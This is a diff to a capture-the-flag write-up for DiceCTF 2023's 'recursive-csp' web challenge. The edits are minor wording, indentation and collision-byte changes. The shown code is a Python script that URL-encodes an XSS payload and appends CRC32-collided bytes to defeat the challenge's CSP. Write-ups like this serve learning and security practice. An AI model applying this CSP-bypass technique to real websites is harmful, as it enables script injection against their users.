@@ -250,7 +250,7 @@ target.txt, read 1 bytes
 	CRC32: f4dbdf21
 ```
 
-> Note: The `-n` flag must be used to remove the new line character (`\n`).
+> Note: The `-n` flag must be used to remove the new line character (`\n`) in the end.
 
 ```shell
 ┌[siunam♥earth]-(~/ctf/DiceCTF-2023/Web/recursive-csp)-[2023.02.08|17:42:17(HKT)]
@@ -278,14 +278,14 @@ Next, URL encode the XSS payload **and the collided bytes**:
 import urllib.parse
 
 def main():
-	url = 'https://recursive-csp.mc.ax/?name='
-	XSSpayload = ''.join(open('payload.txt', 'r'))
-	matchedBytes = '%3a%76%db%41'
+    url = 'https://recursive-csp.mc.ax/?name='
+    XSSpayload = ''.join(open('payload.txt', 'r'))
+    matchedBytes = '%c3%71%37%2f'
 
-	print(f'URL encoded Payload:\n{url}{urllib.parse.quote(XSSpayload)}{matchedBytes}')
+    print(f'URL encoded Payload:\n{url}{urllib.parse.quote(XSSpayload)}{matchedBytes}')
 
 if __name__ == '__main__':
-	main()
+    main()
 ```
 
 ```shell
@@ -342,7 +342,7 @@ c3 71 37 2f
 
 **URL encode it:**
 ```py
-	matchedBytes = '%c3%71%37%2f'
+    matchedBytes = '%c3%71%37%2f'
 ```
 
 ```shell
@@ -417,7 +417,7 @@ This script will loop through hex `0x0` to hex `0xffffffff`, which is from 0 to 
 
 However, using Python to do that would take a very, very long time.
 
-To address this issue, we switch to **Rust**.
+To address this issue, we can use **Rust**.
 
 > Rust is blazingly fast and memory-efficient: with no runtime or garbage collector, it can power performance-critical services, run on embedded devices, and easily integrate with other languages.
 
